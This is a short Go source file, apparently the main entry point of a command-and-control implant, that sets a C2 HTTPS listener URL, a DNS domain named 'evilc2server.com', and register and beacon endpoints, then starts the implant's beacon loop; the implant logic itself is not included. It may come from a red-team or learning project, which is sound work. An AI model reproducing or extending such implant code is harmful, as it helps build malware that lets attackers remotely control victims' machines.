package main

import (
	"math/rand"
	"time"
)

const (
	C2HTTPSURI            = "https://listener.free.beeceptor.com"
	C2DNSDOMAIN           = "evilc2server.com"
	C2REGISTERENDPOINT    = "/register"
	C2HTTPSBEACONENDPOINT = "/beacon"
)

func init() {
	// TODO: fix - Seed is depricated
	rand.Seed(time.Now().UnixNano())
}

func main() {
	implant, err := NewImplant()
	if err != nil {
		panic(err)
	}
	err = implant.BeaconLoop()
	if err != nil {
		panic(err)
	}
}
